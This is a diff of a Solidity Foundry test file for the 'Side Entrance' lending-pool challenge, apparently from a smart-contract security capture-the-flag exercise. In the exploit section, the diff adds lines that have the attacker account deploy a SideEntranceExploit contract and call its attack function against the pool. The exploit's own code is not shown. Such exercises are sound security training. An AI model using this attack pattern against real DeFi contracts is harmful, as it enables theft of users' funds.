@@ -4,13 +4,14 @@ pragma solidity >=0.8.0;
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
-import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceLenderPool, SideEntranceExploit} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
 
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
 
     Utilities internal utils;
     SideEntranceLenderPool internal sideEntranceLenderPool;
+    SideEntranceExploit internal sideEntranceExploit;
     address payable internal attacker;
     uint256 public attackerInitialEthBalance;
 
@@ -36,7 +37,10 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        sideEntranceExploit = new SideEntranceExploit();
+        sideEntranceExploit.attack(address(sideEntranceLenderPool));
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
